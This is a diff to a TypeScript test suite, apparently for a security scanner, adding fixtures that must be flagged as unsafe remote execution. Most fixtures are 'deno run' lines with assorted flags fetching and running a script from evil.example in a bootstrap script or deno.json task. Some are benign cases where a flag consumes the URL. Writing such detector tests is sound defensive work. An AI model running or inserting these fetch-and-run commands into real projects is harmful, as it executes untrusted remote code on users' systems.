@@ -65,6 +65,94 @@ const RUNNERS: Record<string, { path: string; body: string }> = {
     path: "scripts/bootstrap.sh",
     body: "deno run --reload --allow-net https://evil.example/x.ts",
   },
+  "deno run --inspect URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --inspect https://evil.example/x.ts",
+  },
+  "deno run --inspect-brk URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --inspect-brk https://evil.example/x.ts",
+  },
+  "deno run --inspect-wait URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --inspect-wait https://evil.example/x.ts",
+  },
+  "deno run --inspect with an address URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --inspect=127.0.0.1:9229 https://evil.example/x.ts",
+  },
+  "deno run --watch URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --watch https://evil.example/x.ts",
+  },
+  "deno run --watch-hmr URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --watch-hmr https://evil.example/x.ts",
+  },
+  "deno run --ext with a value URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --ext=ts https://evil.example/x.ts",
+  },
+  "deno run --env-file URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --env-file=.env https://evil.example/x.ts",
+  },
+  "deno run --env URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --env https://evil.example/x.ts",
+  },
+  "deno run --lock URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --lock=deno.lock https://evil.example/x.ts",
+  },
+  "deno run -L with a level URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run -L info https://evil.example/x.ts",
+  },
+  "deno run --log-level URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --log-level=info https://evil.example/x.ts",
+  },
+  "deno run --log-level with a separate level URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --log-level info https://evil.example/x.ts",
+  },
+  "deno run --check URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --check https://evil.example/x.ts",
+  },
+  "deno run --allow-net then --inspect URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --allow-net --inspect https://evil.example/x.ts",
+  },
+  "deno run --config with a value URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --config=deno.json https://evil.example/x.ts",
+  },
+  "deno run --cert URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --cert=ca.pem https://evil.example/x.ts",
+  },
+  "deno run --v8-flags URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --v8-flags=--max-old-space-size=512 https://evil.example/x.ts",
+  },
+  "deno run --seed URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --seed=1 https://evil.example/x.ts",
+  },
+  "deno run --node-modules-dir URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --node-modules-dir https://evil.example/x.ts",
+  },
+  "deno run --vendor URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --vendor https://evil.example/x.ts",
+  },
+  "deno run --preload URL": {
+    path: "scripts/bootstrap.sh",
+    body: "deno run --preload=./pre.ts https://evil.example/x.ts",
+  },
   "deno run --allow-net URL in a deno.json task": {
     path: "deno.json",
     body: '{"tasks":{"setup":"deno run --allow-net https://evil.example/x.ts"}}',
@@ -129,6 +217,31 @@ test("running local or registry content keeps no unsafe-execution finding", () =
     {
       path: "scripts/bootstrap.sh",
       body: "deno run --config https://example.com/deno.json ./local.ts",
+    },
+    // A value-taking flag consumes the URL as its own value, so there
+    // is no module left to run: --log-level/-L take the level, --lock
+    // and --ext take their file or extension as a separate token.
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --log-level https://example.com/module.ts",
+    },
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run -L https://example.com/module.ts",
+    },
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --lock https://example.com/module.ts",
+    },
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --ext https://example.com/module.ts",
+    },
+    // A target-preserving flag does not move the target: the URL after
+    // a local script is still script data.
+    {
+      path: "scripts/bootstrap.sh",
+      body: "deno run --inspect ./local.ts https://api.example/data",
     },
     // A permission flag does not move the target: the URL after a local
     // script is still script data, and a registry specifier is still
